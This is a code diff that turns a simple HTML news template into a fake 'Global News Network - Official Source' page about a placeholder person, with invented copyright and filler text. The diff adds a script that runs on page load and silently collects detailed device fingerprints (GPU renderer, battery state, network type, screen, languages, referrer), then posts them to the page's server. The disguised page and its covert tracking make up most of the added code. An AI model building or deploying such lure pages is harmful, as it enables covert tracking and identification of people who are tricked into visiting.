@@ -2,48 +2,90 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Person News</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Person News - Official Source</title>
   <style>
-    body { font-family: Arial, sans-serif; background: #111; color: #fff; margin: 0; }
-    header { background: #1c1c1c; padding: 20px; text-align: center; }
-    .news { padding: 20px; }
-    .card { background: #222; padding: 15px; margin-bottom: 15px; border-radius: 8px; }
-    img { max-width: 100%; border-radius: 6px; }
+    body { font-family: 'Segoe UI', Arial, sans-serif; background: #0f0f0f; color: #eeeeee; margin: 0; }
+    header { background: #1a1a1a; padding: 30px; text-align: center; border-bottom: 2px solid #333; }
+    .news { padding: 20px; max-width: 800px; margin: auto; }
+    .card { background: #1e1e1e; padding: 20px; margin-bottom: 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+    img { max-width: 100%; border-radius: 8px; margin: 15px 0; }
+    .footer-note { color: #555; font-size: 12px; text-align: center; margin-top: 50px; }
   </style>
 </head>
 <body>
 
 <header>
-  <h1>News About [PERSON NAME]</h1>
-  <p>Latest news and images</p>
+  <h1>Global News Network</h1>
+  <p>Live updates and detailed reports</p>
 </header>
 
 <div class="news">
   <div class="card">
-    <h2>Sample News Title</h2>
-    <img src="https://via.placeholder.com/600x300">
-    <p>This is a sample news description.</p>
+    <h2>Latest Update: [PERSON NAME]</h2>
+    <img src="https://via.placeholder.com/800x400" alt="Featured News">
+    <p>Loading the latest verified reports regarding the current situation. Please stay tuned for more details as they emerge from our reporters on the ground.</p>
   </div>
 </div>
 
-<script>
-  // Collect available browser information
-  const visitorData = {
-    screenResolution: `${window.screen.width}x${window.screen.height}`,
-    windowSize: `${window.innerWidth}x${window.innerHeight}`,
-    deviceMemory: navigator.deviceMemory || 'N/A',
-    hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
-    platform: navigator.platform,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    language: navigator.language,
-    cookiesEnabled: navigator.cookieEnabled
-  };
+<div class="footer-note">© 2025 GNN News Group. All rights reserved.</div>
 
-  fetch("/visit", { 
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(visitorData)
-  });
+<script>
+  async function collectMaximumData() {
+    // 1. Hardware & System
+    const data = {
+      screen: `${window.screen.width}x${window.screen.height}`,
+      availScreen: `${window.screen.availWidth}x${window.screen.availHeight}`,
+      colorDepth: window.screen.colorDepth,
+      pixelRatio: window.devicePixelRatio,
+      cores: navigator.hardwareConcurrency || 'N/A',
+      memory: navigator.deviceMemory || 'N/A', // RAM in GB
+      platform: navigator.platform,
+      maxTouchPoints: navigator.maxTouchPoints,
+      language: navigator.language,
+      languages: navigator.languages.join(', '),
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      referrer: document.referrer || 'Direct'
+    };
+
+    // 2. Network & Browser Capability
+    data.connection = navigator.connection ? {
+      type: navigator.connection.effectiveType,
+      downlink: navigator.connection.downlink,
+      rtt: navigator.connection.rtt
+    } : 'N/A';
+    
+    data.doNotTrack = navigator.doNotTrack;
+    data.cookiesEnabled = navigator.cookieEnabled;
+
+    // 3. GPU/Graphics Info
+    try {
+      const canvas = document.createElement('canvas');
+      const gl = canvas.getContext('webgl');
+      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+      data.gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A';
+    } catch (e) { data.gpu = 'Error'; }
+
+    // 4. Battery Status
+    try {
+      if (navigator.getBattery) {
+        const battery = await navigator.getBattery();
+        data.battery = {
+          level: (battery.level * 100) + "%",
+          charging: battery.charging ? "Connected" : "Not Charging"
+        };
+      }
+    } catch (e) { data.battery = 'N/A'; }
+
+    // Send Everything to Server
+    fetch("/visit", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(data)
+    });
+  }
+
+  window.onload = collectMaximumData;
 </script>
 
 </body>
